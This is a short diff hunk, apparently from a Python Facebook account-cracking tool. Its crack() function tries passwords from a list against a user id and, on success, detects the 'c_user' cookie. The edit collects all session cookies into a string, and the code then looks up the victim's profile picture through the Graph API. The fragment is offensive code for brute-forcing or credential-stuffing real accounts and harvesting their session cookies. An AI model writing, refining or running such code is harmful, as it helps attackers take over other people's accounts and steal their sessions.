@@ -350,7 +350,7 @@ def crack(uid, password_list, total_count):
             # Check response
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
-                kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                kuki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
